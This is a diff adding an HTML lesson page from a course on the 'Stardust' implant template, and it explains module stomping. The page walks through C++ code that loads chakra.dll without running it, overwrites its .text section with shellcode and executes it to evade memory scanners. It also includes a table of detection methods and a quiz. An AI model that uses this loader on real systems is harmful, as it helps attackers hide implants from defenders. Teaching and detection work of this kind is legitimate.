@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 9: Module Stomping - Stardust Course</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>⭐</text></svg>">
+<link rel="stylesheet" href="../../assets/course.css">
+<style>:root{--accent:#c084fc;--accent2:#38bdf8;--gradient:linear-gradient(135deg,#c084fc,#38bdf8)}</style>
+</head>
+<body>
+
+<button class="hamburger" onclick="document.querySelector('nav').classList.toggle('open')">&#9776;</button>
+
+<nav>
+<div class="logo">
+<h2>Stardust Course</h2>
+<span>Modern Implant Template Masterclass</span>
+</div>
+<a class="home-link" href="../Stardust_index.html">&larr; Course Home</a>
+<a class="mod-link" href="module1.html"><span class="diff d1">01</span> Why Stardust Exists</a>
+<a class="mod-link" href="module2.html"><span class="diff d1">02</span> Modern C++ for Shellcode</a>
+<a class="mod-link" href="module3.html"><span class="diff d1">03</span> Project Anatomy</a>
+<a class="mod-link" href="module4.html"><span class="diff d2">04</span> Position-Independent Code</a>
+<a class="mod-link" href="module5.html"><span class="diff d2">05</span> Compile-Time Hashing</a>
+<a class="mod-link" href="module6.html"><span class="diff d2">06</span> PEB &amp; API Resolution</a>
+<a class="mod-link" href="module7.html"><span class="diff d2">07</span> The symbol&lt;T&gt; Template</a>
+<a class="mod-link" href="module8.html"><span class="diff d3">08</span> Linker Script &amp; Sections</a>
+<a class="mod-link active" href="module9.html"><span class="diff d3">09</span> Module Stomping</a>
+<a class="mod-link" href="module10.html"><span class="diff d3">10</span> Full Chain &amp; Extending</a>
+</nav>
+
+<main>
+<span class="diff-badge hard">Difficulty: Advanced</span>
+<h1>Module 9: Module Stomping</h1>
+<p class="subtitle">A loader-side injection technique for delivering shellcode like Stardust into memory.</p>
+
+<div class="card warn">
+<h4>Important Framing</h4>
+<p>Module stomping is <strong>not a feature of Stardust itself</strong>. It is a <strong>loader-side injection technique</strong> that can be used <em>with</em> Stardust (or any other shellcode). Stardust is the <strong>payload</strong> &mdash; the shellcode that gets executed. Module stomping is one way to <strong>deliver</strong> that payload into a target process's memory. Stardust includes a test harness (<code>stomper.cc</code>) that demonstrates this technique for testing purposes.</p>
+</div>
+
+<h2>What Is Module Stomping?</h2>
+<p>Module stomping overwrites the <code>.text</code> (code) section of a <strong>legitimately loaded DLL</strong> with your shellcode. Instead of allocating new executable memory (which is suspicious), you reuse memory that already exists and is already marked as executable. From the perspective of memory scanners, the code appears to live inside a signed Microsoft DLL.</p>
+
+<div class="card highlight">
+<h4>Why Not Just VirtualAlloc?</h4>
+<p>Calling <code>VirtualAlloc</code> with <code>PAGE_EXECUTE_READWRITE</code> to create new executable memory is the most common shellcode injection approach &mdash; and therefore the most monitored. Memory scanners specifically look for private executable regions that aren't backed by a file on disk. Module stomping avoids this by writing shellcode into memory that <em>is</em> backed by a legitimate DLL file, making it appear as normal loaded module memory.</p>
+</div>
+
+<h2>The Module Stomping Flow</h2>
+<p>The stomper test harness demonstrates these steps:</p>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">Module Stomping: 7-Step Flow</h4>
+<div class="flow" style="flex-direction:column;gap:0">
+<div class="box hl" style="width:100%;border-radius:8px 8px 0 0">
+<strong>Step 1:</strong> Read shellcode from file (stardust.bin)
+</div>
+<div class="box b" style="width:100%;border-radius:0">
+<strong>Step 2:</strong> LoadLibraryExA with DONT_RESOLVE_DLL_REFERENCES<br>
+<span style="font-size:.75rem;color:var(--dim)">Loads the sacrificial DLL without calling DllMain or resolving imports</span>
+</div>
+<div class="box" style="width:100%;border-radius:0">
+<strong>Step 3:</strong> Parse PE headers to locate the .text section<br>
+<span style="font-size:.75rem;color:var(--dim)">Walk DOS header &rarr; NT headers &rarr; section headers &rarr; find ".text"</span>
+</div>
+<div class="box y" style="width:100%;border-radius:0">
+<strong>Step 4:</strong> VirtualProtect to PAGE_READWRITE<br>
+<span style="font-size:.75rem;color:var(--dim)">Change .text from RX to RW so we can write to it</span>
+</div>
+<div class="box r" style="width:100%;border-radius:0">
+<strong>Step 5:</strong> memcpy shellcode over the .text section<br>
+<span style="font-size:.75rem;color:var(--dim)">Overwrite the DLL's original code with Stardust</span>
+</div>
+<div class="box y" style="width:100%;border-radius:0">
+<strong>Step 6:</strong> VirtualProtect to PAGE_EXECUTE_READ<br>
+<span style="font-size:.75rem;color:var(--dim)">Restore executable permissions (RX, not RWX)</span>
+</div>
+<div class="box g" style="width:100%;border-radius:0 0 8px 8px">
+<strong>Step 7:</strong> Call the entry point (byte 0 of the stomped section)<br>
+<span style="font-size:.75rem;color:var(--dim)">Jump to RipStart &mdash; Stardust begins executing</span>
+</div>
+</div>
+</div>
+
+<h2>Stomper Test Code Concepts</h2>
+<p>The <code>stomper.cc</code> test harness in the Stardust repository demonstrates these concepts. Here is a simplified representation of the key operations:</p>
+
+<pre><code><span class="lang-tag">C++</span>// Simplified stomper.cc concepts
+
+// Step 1: Read the shellcode blob from disk
+auto shellcode = read_file( "stardust.bin" );
+
+// Step 2: Load a sacrificial DLL without initialization
+// DONT_RESOLVE_DLL_REFERENCES prevents DllMain from running
+// and skips import resolution - we don't need the DLL to function
+HMODULE hMod = LoadLibraryExA(
+    "C:\\Windows\\System32\\chakra.dll",
+    NULL,
+    DONT_RESOLVE_DLL_REFERENCES
+);
+
+// Step 3: Parse PE headers to find .text section
+auto dos = (PIMAGE_DOS_HEADER)hMod;
+auto nt  = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dos-&gt;e_lfanew);
+auto sec = IMAGE_FIRST_SECTION( nt );
+
+void*  textBase = nullptr;
+size_t textSize = 0;
+
+for ( int i = 0; i &lt; nt-&gt;FileHeader.NumberOfSections; i++ ) {
+    if ( strcmp( (char*)sec[i].Name, ".text" ) == 0 ) {
+        textBase = (BYTE*)hMod + sec[i].VirtualAddress;
+        textSize = sec[i].Misc.VirtualSize;
+        break;
+    }
+}
+
+// Step 4: Make .text writable
+DWORD oldProtect;
+VirtualProtect( textBase, textSize, PAGE_READWRITE, &amp;oldProtect );
+
+// Step 5: Overwrite with shellcode
+memcpy( textBase, shellcode.data(), shellcode.size() );
+
+// Step 6: Restore to executable (RX, not RWX)
+VirtualProtect( textBase, textSize, PAGE_EXECUTE_READ, &amp;oldProtect );
+
+// Step 7: Call the entry point
+auto entry = (void(*)())textBase;
+entry();  // RipStart executes here</code></pre>
+
+<h2>Why chakra.dll?</h2>
+<p>The stomper test harness uses <code>chakra.dll</code> (the legacy Chakra JavaScript engine) as the sacrificial DLL. It's a good candidate because:</p>
+<ul>
+<li><strong>Large .text section</strong> &mdash; plenty of room for shellcode (Stardust is relatively small)</li>
+<li><strong>Microsoft-signed</strong> &mdash; the DLL's digital signature makes the memory region appear more legitimate to some scanners</li>
+<li><strong>Rarely used</strong> &mdash; modern Windows applications use V8 (Chromium) or other engines, so stomping chakra.dll is unlikely to break anything in the process</li>
+<li><strong>Ships with Windows</strong> &mdash; no need to drop an extra DLL; it's already on disk</li>
+</ul>
+
+<h2>Detection Considerations</h2>
+<p>Module stomping is not invisible. Defenders have several ways to detect it:</p>
+
+<table>
+<tr><th>Detection Method</th><th>How It Works</th><th>What It Catches</th></tr>
+<tr>
+<td><strong>PE-sieve comparison</strong></td>
+<td>Compares the in-memory contents of a loaded DLL against the on-disk file</td>
+<td>The stomped .text section won't match the original DLL's code, immediately flagging the modification</td>
+</tr>
+<tr>
+<td><strong>RWX transition monitoring</strong></td>
+<td>Monitors calls to VirtualProtect that change page permissions</td>
+<td>The RX &rarr; RW &rarr; RX transition pattern on a loaded DLL is suspicious and can be logged by EDR hooks</td>
+</tr>
+<tr>
+<td><strong>LoadLibraryEx monitoring</strong></td>
+<td>Flags calls to LoadLibraryEx with the DONT_RESOLVE_DLL_REFERENCES flag</td>
+<td>Legitimate code rarely uses this flag. Loading a DLL without resolving its imports suggests injection preparation</td>
+</tr>
+<tr>
+<td><strong>Code integrity checks</strong></td>
+<td>Periodically scans loaded modules for unexpected code modifications</td>
+<td>Any loaded DLL whose .text section has been modified since loading</td>
+</tr>
+</table>
+
+<div class="card green">
+<h4>Key Takeaway</h4>
+<p>Module stomping is a <strong>delivery mechanism</strong>, not a payload feature. Stardust (the payload) doesn't know or care how it was loaded &mdash; it works the same whether injected via module stomping, process hollowing, or any other technique. The <code>stomper.cc</code> test harness exists to demonstrate and test Stardust execution, not as a production loader.</p>
+</div>
+
+<div class="quiz" id="quiz1">
+<h4>Knowledge Check</h4>
+<div class="quiz-q" data-correct="2">
+<p>Q1: Why is DONT_RESOLVE_DLL_REFERENCES used when loading the sacrificial DLL?</p>
+<label data-opt="0"><input type="radio" name="q9_0"> To make the DLL load faster</label>
+<label data-opt="1"><input type="radio" name="q9_0"> To prevent the DLL from being detected by antivirus</label>
+<label data-opt="2"><input type="radio" name="q9_0"> To prevent DllMain from executing and imports from being resolved, since the DLL's code will be overwritten anyway</label>
+<label data-opt="3"><input type="radio" name="q9_0"> To load the DLL in a suspended state for debugging</label>
+<div class="explain">Correct! Since we're going to overwrite the DLL's .text section with shellcode, we don't want or need the DLL to actually initialize. DONT_RESOLVE_DLL_REFERENCES maps the DLL into memory without calling DllMain or resolving its import table, giving us a clean memory region backed by a legitimate file.</div>
+</div>
+<div class="quiz-q" data-correct="1">
+<p>Q2: What is the primary advantage of module stomping over allocating new memory with VirtualAlloc?</p>
+<label data-opt="0"><input type="radio" name="q9_1"> Module stomping is faster than VirtualAlloc</label>
+<label data-opt="1"><input type="radio" name="q9_1"> The shellcode resides in memory backed by a legitimate, signed DLL rather than in a suspicious private allocation</label>
+<label data-opt="2"><input type="radio" name="q9_1"> Module stomping provides RWX permissions automatically</label>
+<label data-opt="3"><input type="radio" name="q9_1"> VirtualAlloc cannot allocate executable memory on modern Windows</label>
+<div class="explain">Correct! Memory scanners specifically flag private executable regions that aren't backed by a file on disk. With module stomping, the shellcode lives in memory that's backed by a legitimate DLL file (e.g., a Microsoft-signed system DLL), making it appear as normal loaded module memory rather than a suspicious standalone allocation.</div>
+</div>
+<button class="quiz-btn" onclick="gradeQuiz('quiz1')">Check Answers</button>
+<div class="quiz-result"></div>
+</div>
+
+<div class="nav-btns">
+<a href="module8.html">&larr; Prev: Linker Script &amp; Sections</a>
+<a class="primary" href="module10.html">Next: Full Chain &amp; Extending &rarr;</a>
+</div>
+</main>
+
+<script src="../../assets/course.js"></script>
+</body>
+</html>
